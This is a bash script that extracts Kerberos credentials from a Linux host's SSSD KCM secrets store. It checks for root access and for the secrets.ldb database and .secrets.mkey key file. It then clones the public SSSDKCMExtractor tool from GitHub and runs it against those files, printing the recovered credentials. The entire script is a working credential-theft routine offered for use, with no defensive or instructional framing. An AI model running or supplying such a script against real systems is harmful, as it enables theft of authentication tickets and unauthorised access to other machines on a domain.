#!/bin/bash
# Extract credentials from SSSD KCM database

echo "=== Extracting SSSD KCM Credentials ==="
echo ""

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo "Warning: This script requires root access to read SSSD secrets"
    echo "Please run with: sudo $0"
fi
echo ""

# Check if SSSD is installed
echo "Checking SSSD installation:"
if [ -d /var/lib/sss/secrets ]; then
    echo "✓ SSSD secrets directory found"
else
    echo "✗ SSSD secrets directory not found"
    echo "  SSSD may not be installed or configured"
    exit 1
fi
echo ""

# Check for required files
DB_FILE="/var/lib/sss/secrets/secrets.ldb"
KEY_FILE="/var/lib/sss/secrets/.secrets.mkey"

echo "Checking required files:"
if [ -f "$DB_FILE" ]; then
    echo "✓ Database file found: $DB_FILE"
else
    echo "✗ Database file not found: $DB_FILE"
fi

if [ -f "$KEY_FILE" ]; then
    echo "✓ Key file found: $KEY_FILE"
else
    echo "✗ Key file not found: $KEY_FILE"
fi
echo ""

# Check if SSSDKCMExtractor is installed
if [ -d SSSDKCMExtractor ]; then
    echo "SSSDKCMExtractor already cloned"
else
    echo "Cloning SSSDKCMExtractor..."
    git clone https://github.com/fireeye/SSSDKCMExtractor
fi
echo ""

# Run extraction
echo "Extracting credentials..."
cd SSSDKCMExtractor
python3 SSSDKCMExtractor.py \
    --database "$DB_FILE" \
    --key "$KEY_FILE"
cd ..
echo ""

echo "=== Done ==="
echo "Check the output above for extracted credentials"
